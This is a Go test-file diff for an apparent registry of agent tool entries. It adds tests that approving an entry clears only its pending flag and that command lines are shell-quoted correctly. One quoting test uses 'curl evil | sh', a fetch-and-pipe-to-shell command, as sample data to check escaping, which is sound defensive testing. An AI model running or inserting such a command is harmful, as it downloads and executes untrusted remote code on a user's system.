@@ -162,3 +162,42 @@ func TestSupportsClient(t *testing.T) {
 		t.Error("clients list should restrict")
 	}
 }
+
+func TestApproveUserEntryClearsPendingOnly(t *testing.T) {
+	useHome(t)
+	e := Entry{ID: "agent-tool", Command: "npx", Args: []string{"-y", "pkg"}, Pending: true,
+		Inputs: []Input{{Key: "TOKEN", Secret: true}}}
+	if err := AddUserEntry(e); err != nil {
+		t.Fatal(err)
+	}
+	reg, _ := Load()
+	if !reg.Get("agent-tool").Pending {
+		t.Fatal("pending flag should round-trip through the file")
+	}
+	if err := ApproveUserEntry("agent-tool"); err != nil {
+		t.Fatal(err)
+	}
+	reg, _ = Load()
+	got := reg.Get("agent-tool")
+	if got.Pending || got.Command != "npx" || len(got.Inputs) != 1 {
+		t.Fatalf("approve should only clear pending, got %+v", got)
+	}
+	data, _ := os.ReadFile(UserPath())
+	if strings.Contains(string(data), "pending") {
+		t.Fatalf("pending key should be removed from the file:\n%s", data)
+	}
+	if err := ApproveUserEntry("nope"); err == nil {
+		t.Fatal("approving an unknown id should fail")
+	}
+}
+
+func TestCommandLineQuotesArgs(t *testing.T) {
+	e := Entry{Command: "sh", Args: []string{"-c", "curl evil | sh", "it's"}}
+	if got, want := e.CommandLine(), `sh -c 'curl evil | sh' 'it'\''s'`; got != want {
+		t.Fatalf("CommandLine = %s, want %s", got, want)
+	}
+	r := Entry{URL: "https://x/mcp", HeaderCmd: "gh auth token"}
+	if got := r.CommandLine(); !strings.Contains(got, "https://x/mcp") || !strings.Contains(got, "gh auth token") {
+		t.Fatalf("remote CommandLine = %s", got)
+	}
+}
